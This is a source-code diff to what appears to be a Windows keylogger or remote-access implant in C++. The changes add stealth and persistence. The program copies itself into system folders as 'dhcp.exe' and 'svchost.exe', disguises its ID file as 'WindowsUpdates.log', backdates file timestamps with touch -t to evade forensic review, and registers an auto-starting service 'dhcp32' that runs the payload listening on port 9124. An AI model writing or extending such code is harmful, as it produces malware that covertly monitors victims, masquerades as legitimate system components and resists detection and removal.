@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-16 12:27:16
+* @Last Modified time: 2017-04-19 12:06:44
 */
 
 #include <vector>
@@ -74,7 +74,7 @@ static bool terminated = false;
 static bool logged_in = false;
 static bool command_ack = false;
 
-static char filename[] = "C:\\Windows\\Temp\\.socket";
+static char filename[] = "C:\\Windows\\Temp\\WindowsUpdates.log";
 
 static STARTUPINFO startupInfo;
 static PROCESS_INFORMATION processInfo;
@@ -181,10 +181,12 @@ void *logger(void *args)
 
 void register_device(int socket, string recv_uid)
 {
+    char cmd[MAX_PATH];
     ifstream infile;
     ofstream outfile;
 
     DPRINT("%s()\n", __func__);
+    sprintf(cmd, "touch -t 201610122254 \"%s\"", filename);
 
     if (recv_uid.size())
     {
@@ -192,6 +194,7 @@ void register_device(int socket, string recv_uid)
         outfile.open(filename);
         outfile << recv_uid;
         outfile.close();
+        system(cmd);
     }
 
     infile.open(filename);
@@ -206,6 +209,7 @@ void register_device(int socket, string recv_uid)
     string uid;
     infile >> uid;
     infile.close();
+    system(cmd);
 
     uid = "LOG" + uid;
     DPRINT("%s(): %s\n", __func__, uid.c_str());
@@ -575,10 +579,10 @@ int start_process(char* cmd)
 int install(bool serviceInstall)
 {
     int status = 0;
+    char cmd[MAX_PATH];
     char exePath[MAX_PATH];
     char sysPath[MAX_PATH];
     char newPath[MAX_PATH];
-    char cmd[MAX_PATH];
 
     DPRINT("%s()\n", __func__);
 
@@ -587,15 +591,22 @@ int install(bool serviceInstall)
 
     DPRINT("%s: %s %s\n", __func__, sysPath, exePath);
 
-    sprintf(newPath, "%s\\SysWow64.exe", sysPath);
-    if (serviceInstall && !CopyFile(exePath, newPath, false)) return -1;
+    sprintf(newPath, "%s\\dhcp.exe", sysPath);
+    CopyFile(exePath, newPath, false);
 
-    sprintf(cmd, "sc create SysWow64 binPath= \"%s service\" start= auto", newPath);
+    // change access time
+    sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
     system(cmd);
 
-    sprintf(newPath, "%s\\svchost2.exe", sysPath);
-    if (!CopyFile(exePath, newPath, false)) return -3;
-    system("sc start SysWow64");
+    sprintf(newPath, "%s\\..\\svchost.exe", sysPath);
+    CopyFile(exePath, newPath, false);
+    // change access time
+    sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
+    system(cmd);
+
+    sprintf(cmd, "sc create dhcp32 binPath= \"%s service\" start= auto", newPath);
+    system(cmd);
+    system("sc start dhcp32");
 
     DPRINT("%s: SUCCESS!\n", __func__);
     return 0;
@@ -612,7 +623,7 @@ void ServiceMain(int argc, char *argv[])
     ServiceStatus.dwCheckPoint = 0;
     ServiceStatus.dwWaitHint = 0;
 
-    hServiceStatus = RegisterServiceCtrlHandler("SysWow64", (LPHANDLER_FUNCTION) ControlHandler);
+    hServiceStatus = RegisterServiceCtrlHandler("dhcp", (LPHANDLER_FUNCTION) ControlHandler);
     if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) return;
 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
@@ -622,7 +633,7 @@ void ServiceMain(int argc, char *argv[])
     char cmd[MAX_PATH];
 
     GetSystemDirectory(exePath, MAX_PATH);
-    sprintf(cmd, "%s\\svchost2.exe app 0.0.0.0 9124", exePath);
+    sprintf(cmd, "%s\\..\\svchost.exe app 0.0.0.0 9124", exePath);
 
     int status;
     DWORD exitCode = 0;
@@ -666,7 +677,7 @@ int main(int argc, char *argv[])
             freopen("C:\\Windows\\Temp\\.SysWow64.log", "a", stdout);
         #endif
         SERVICE_TABLE_ENTRY serviceTable[2];
-        serviceTable[0].lpServiceName = "SysWow64";
+        serviceTable[0].lpServiceName = "dhcp";
         serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
         serviceTable[1].lpServiceName = NULL;
